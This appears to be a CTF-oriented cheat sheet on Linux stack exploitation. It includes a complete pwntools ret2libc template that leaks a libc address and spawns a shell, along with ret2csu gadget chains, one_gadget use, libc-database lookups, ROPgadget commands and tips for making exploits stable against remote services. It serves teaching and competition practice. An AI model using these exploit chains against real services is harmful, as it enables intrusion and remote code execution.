# Stack Exploitation (Stack Pwn)

## Trigger Conditions and Pre-Checks

### Reading checksec

```bash
checksec --file=./vuln
# or pwntools built-in
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output field | Impact | Response |
|---------|------|------|
| `NX disabled` | stack executable | just drop shellcode in |
| `Canary found` | stack overflow will be detected | must leak the canary or bypass (forked process / format string) |
| `PIE enabled` | .text base randomized | must leak a code address |
| `No PIE` | .text fixed | gadget addresses hardcoded |
| `Full RELRO` | got not writable | can't touch got; go ret2libc / one_gadget |
| `Partial RELRO` | got writable | can modify the got table |
| `FORTIFY` | some libc functions replaced with `_chk` versions | `read_chk` can still overflow; `strcpy_chk` can't |

### Pinpointing the Stack Overflow Length

```python
# pwntools cyclic pattern
from pwn import *
context.arch = 'amd64'

# 1. generate a cyclic pattern
payload = cyclic(200)

# 2. feed it to trigger the crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. read the value on RSP from the core dump
core = p.corefile
fault = core.fault_addr  # or the 8 bytes pointed to by core.rsp
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# 64-bit use cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32/64-bit Calling Convention Cheatsheet

| Architecture | Argument passing | Return | Notes |
|------|---------|------|------|
| x86 (32-bit) | stack args (cdecl: caller cleans the stack) | eax | stack layout: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at the call entry |
| ARM32 | r0-r3, stack | r0 | lr holds the return address; bx lr returns |
| ARM64 | x0-x7, stack | x0 | like SysV, stricter alignment |

## Full ret2libc pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# === environment config ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# auto patchelf so the local run uses the challenge libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # measured via cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # make puts print its own puts@got address
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # return to main, reuse the overflow for a second round

p.sendlineafter(b'> ', payload)

# receive the leak (anchor with recvuntil, don't use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# derive libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # key: fix the 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack Alignment Pitfall (must read)

```text
Symptom: works locally, but remotely system SIGSEGVs immediately on entry
Cause: libc's system → do_system → internally does movaps xmm0, [rsp] somewhere
       which requires rsp to be 16-byte aligned
Failure: when your ROP chain jumps into system, the low bit of rsp is 0x8, not 0x0
Fix: insert a `ret` gadget in the ROP chain (consumes 8 bytes, realigns rsp)
```

## ret2csu (universal gadget)

When the binary lacks a third-argument gadget like `pop rdx; ret`, use the fixed structure in `__libc_csu_init` (present in every statically linked program with glibc < 2.34).

```text
fixed pattern at the end of __libc_csu_init:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

also in the middle:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools style:

```python
csu_pop = 0x40119a  # first part (pop rbx..r15; ret)
csu_call = 0x401180  # second part (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (so the later cmp rbx,rbp passes → rbx+1 == rbp)
    p += p64(call_target)    # r12 = dereferenced [r12+rbx*8] to get the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # after the second part returns, pop 7 more
    return p
```

Best for: writing a function pointer to bss, then invoking it with csu — commonly used to jump to bss and execute a ROP after the `read(0, bss, 0x100)` stage.

## one_gadget Usage

```bash
one_gadget ./libc.so.6

# output example:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # pick the one whose constraints you can satisfy
```

**Pitfall**: one_gadget constraints are extremely hard to satisfy on some libc versions (2.34+); plain ret2libc is more reliable.

## libc-database Lookup

Scenario: the challenge doesn't give a libc; you only leak a few function addresses and must derive the version.

```bash
cd ~/tools/libc-database

# look up with the leaked puts and read addresses (last 3 digits)
./find puts 0x6f0 read 0xfd
# output: libc6_2.31-0ubuntu9.9_amd64

# dump all symbol offsets for the matching libc
./dump libc6_2.31-0ubuntu9.9_amd64

# download the actual libc.so.6 locally
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# online libc-database query (no local install)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget Cheatsheet

```bash
# basic: pop|ret single reg
ROPgadget --binary ./vuln --only "pop|ret"

# find a syscall
ROPgadget --binary ./vuln | grep ': syscall'

# find specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# find strings
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# output JSON for program parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (broader architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote Stabilization Checklist

| Problem | Symptom | Fix |
|------|------|------|
| wrong libc version | works locally, remote SIGSEGV in system | after leaking, use libc-database to find the actual version |
| stack alignment | system segfaults immediately | add a `ret` gadget |
| network latency | recv gets half the data | use `recvuntil(b'anchor string')`, not `sleep` |
| buffering | no response after sendline | switch to `sendlineafter`, explicitly wait for the prompt |
| ASLR jitter | probabilistic success | check whether it's byte-level brute (1/16 probability isn't stable) |
| TCP nagle | small packets coalesce | `p.settimeout(2); p.recvall(timeout=2)` as a fallback |

## Debugging Tips

```python
# embedded gdb attach in pwntools
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# run inside gdb from the start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

Common GEF/pwndbg commands:

```text
checksec               # view protections
vmmap                  # memory layout
telescope $rsp 30      # stack chain (pwndbg)
stack 30               # similar (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # auto show reg + stack + code (on by default)
ropgadget              # embedded gadget search
```

## Notes

- **NX off + ASLR off** is required for direct shellcode; modern binaries basically all enable NX
- **the canary doesn't change in forked children** — against a forking server you can brute-force it byte by byte (1/256 × 7 bytes)
- **format strings can leak both canary and libc at once** — scan the stack with `%p %p ... %p`
- **DynELF is slow but universal** — with no libc given at all, pwntools' `DynELF` can byte-leak the symbol table using only the program's own IO primitives
- **statically linked programs have no libc.got** — go SROP (sigreturn-oriented programming) or direct syscall

